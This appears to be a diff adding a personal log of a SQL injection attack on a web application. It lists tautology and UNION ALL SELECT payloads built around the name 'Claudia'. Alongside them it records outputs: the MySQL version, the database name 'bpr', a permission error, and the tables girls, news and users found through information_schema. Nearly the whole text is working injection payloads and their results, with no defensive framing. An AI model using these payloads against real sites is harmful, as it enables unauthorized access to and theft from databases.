@@ -1,0 +1,30 @@
+or '1' = '1
+
+Claudia' or '1'='1
+
+Claudia' or '1'='1' '
+
+
+Claudia' UNION ALL SELECT null, null, null '
+
+Claudia' UNION ALL SELECT 1, 2, 3 '
+
+Claudia' UNION ALL SELECT 1, 2, @@version '
+5.5.46
+
+
+Claudia' UNION ALL SELECT table_name, table_type, engine FROM information_schema.tables WHERE '1'='1
+
+Claudia' UNION ALL SELECT 1, 2, 3 FROM information_schema WHERE '1'='1
+Database access failed: SELECT command denied to user 'www'@'localhost' for table 'information_schema'
+
+Claudia' UNION ALL SELECT database(), database(), database() '
+database = bpr 
+
+
+Claudia' UNION ALL SELECT database(), distinct(db), distinct(db) FROM mysql.db '
+
+
+Claudia' UNION ALL SELECT table_schema,table_name,null FROM information_schema.tables WHERE '1'='1
+This gives me all the tables. 
+The tables are: girls, news, users all int he database bpr
